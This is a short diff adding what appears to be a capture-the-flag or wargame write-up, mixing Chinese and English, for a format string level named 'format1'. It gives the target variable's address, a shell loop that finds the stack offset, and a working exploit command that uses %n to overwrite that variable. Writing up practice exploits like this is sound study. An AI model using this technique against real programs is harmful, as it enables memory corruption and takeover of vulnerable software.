@@ -1,0 +1,18 @@
+基本思路：本题要求通过format string来修改全局变量target的值，可以通过format string的%n选项来修改target。%n选项将当前已写入的bytes数写入%n对应的integer里边去。
+     1，通过GDB来获取target的地址：0x0804a024;
+     2，用"aaaaaaaa"和若干"%08x"来尝试打印出当前栈的内容，知道打印到format string本身的
+        值为止（即"aaaaaaaaa")，%08x从当前$esp开始，一个%08x打印4个bytes的栈内存内容。
+     3，用"\x24\xa0\x04\x08"来代替format string最开始的"aaaa"，用%n代替输出结果中 
+        "aaaa"对应的%08x，同时用".."补齐四位。
+
+manual test is time-consuming, we can use shell to help:
+    for i in {1..300};do echo "trying offset $i - `./format1 DDDD%$i\\$08x`"; done | grep DDDD44444444   
+to get the offset(174)
+
+then use this offset to exploit
+   ./format1 `python -c 'print("\x24\xa0\x04\x08")'`%174\$08n
+
+format1.sh should be executed as
+   . format1.sh
+instead of
+   ./format1.sh
